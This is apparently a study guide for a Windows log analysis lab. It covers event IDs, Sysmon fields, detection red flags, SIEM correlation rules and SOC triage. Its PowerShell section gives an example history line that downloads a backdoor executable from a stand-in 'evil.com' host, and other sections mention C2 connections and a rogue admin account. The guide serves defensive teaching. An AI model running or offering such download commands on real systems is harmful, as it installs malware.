✅ Windows Log Analysis Lab
🔍 1. What Is Logging and Why It Matters
Logs are records of system or user activity (e.g. logins, processes, file changes).
Critical for:
🧯 Incident Response – Reconstruct attacks
🔎 Threat Hunting – Proactively find threats
🚨 Alerting – Trigger real-time detections
🧠 2. Where Logs Come From in Windows Systems
Logs are categorized and accessed via the Event Viewer:
Log Source
Examples
Location in Event Viewer
Security
Logins, user mgmt, processes
Windows Logs > Security
Application
App crashes, errors
Windows Logs > Application
Sysmon
Advanced process/network/file logs
Apps & Services > Microsoft > Windows > Sysmon > Operational
PowerShell
Cmd history (interactive shell)
ConsoleHost_history.txt file
⚙️ 3. Important Event IDs to Know
Event ID
Type
Purpose
4624
Successful login
Confirm login origin (RDP, local, network)
4625
Failed login
Detect brute-force, spraying
4688
Process creation (basic)
Track new processes (must be enabled)
1
Sysmon: Process creation
Rich info: parent, hash, command line
11
Sysmon: File creation
Detect dropped malware
3
Sysmon: Network connection
Detect outbound C2 traffic
22
Sysmon: DNS queries
Detect suspicious domain access
4720
User created
Backdoor account detection
4732
User added to group
Detect privilege escalation
🔐 4. Investigating Login Events
✅ 4624 – Successful Logon
Important Fields:
Logon Type:
3 = Network logon (e.g. file share)
10 = RDP
Workstation Name
Source IP
Logon ID – Used to trace full session
❌ 4625 – Failed Logon
Look for:
Multiple failures on one account = Brute force
Many accounts, few attempts = Password spraying
Unusual IPs, hostnames (e.g. kali)
🧪 Example:
IP 45.9.100.10 attempts logins for admin, helpdesk, guest — all fail with ID 4625, Type 10 → likely brute force via RDP.
👤 5. User Account Management
Track user creation/modification events for potential attacker persistence.
Event ID
Action
Why It Matters
4720
User created
Look for rogue accounts
4725
User disabled
Could hide SOC accounts
4723/4724
Password changed/reset
Credentials hijack
4732
User added to group
Privilege escalation
🕵️ Investigate:
Subject: Who made the change?
Target: Who was changed/added?
Time: After-hours changes = 🚩​
Logon ID: Trace to source login (4624)
🧪 Example:
User svc_support created admin_backdoor and added it to Administrators at 2:15 AM.
🛠 6. Process Creation (Sysmon ID 1)
Sysmon logs rich process data. Use this to detect tool use, malware, scripts.
🔍 Key Fields:
Image: Path of executable
CommandLine: Args passed to process
ParentImage: What launched it?
Hash: MD5/SHA256 — check on VirusTotal
Logon ID: Correlate to session (4624)
🚩 Red Flags:
Suspicious folder (C:\Temp, Public)
Random names (abc123.exe)
Launched by odd parent (notepad.exe → powershell.exe)
Unknown or malicious hash
🧪 Example:
C:\Users\Public\svhost.exe run by cmd.exe → hash flagged on VirusTotal → likely malware dropper.
🌐 7. Network, File, Registry (Sysmon)
Event ID
Logs...
Use Case
3
Network connections
External C2, data exfil
22
DNS lookups
Calls to shady domains
11
File creations
Dropped malware/scripts
13
Registry modifications
Persistence mechanisms
🔗 Correlate with:
ProcessId → backtrack to Sysmon ID 1
Logon ID → backtrack to user (4624)
🧪 Example:
powershell.exe with PID 8102 creates a.exe (ID 11), connects to 198.51.100.1:4444 (ID 3), DNS request to x.tinyurl.click (ID 22)
📜 8. PowerShell Monitoring
Sysmon logs the start of PowerShell, but not what was run.
✅ Solution: PowerShell History File
📁 Path:
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

​
🔍 Use to see:
Recon: Get-LocalUser, netstat
Downloads: Invoke-WebRequest
Persistence: Scripts, registry edits
🧪 Example:
History shows:
Invoke-WebRequest http://evil.com/backdoor.exe -OutFile C:\Temp\bd.exe

​
But Sysmon only shows powershell.exe ran — not what it did.
📊 9. SIEM and Event Correlation
Use SIEMs (Splunk, ELK, QRadar, etc.) to:
Aggregate logs from multiple sources
Set real-time alerts with correlation rules
Create dashboards for visibility
Query across logs for fast investigations
🧠 Example Correlation Rules:
Logic
Alert Trigger
5× 4625 from same IP in 10s
🔐 Brute Force Detected
4720 + 4732 within 2 min
👑 New Admin Account
PowerShell from cmd.exe
⚠️ Suspicious Parent Process
🧑‍💻 10. SOC Analyst Workflow
Monitor Dashboards – Look for SIEM alerts, spikes
Triage Alerts – Confirm log source, event type
Correlate Events:
Use Logon ID → Trace session
Use ProcessId → Trace process chain
Decide Action:
Confirm true/false positive
Block IP, isolate host, escalate if needed
Tune Rules – Reduce noise, improve detections
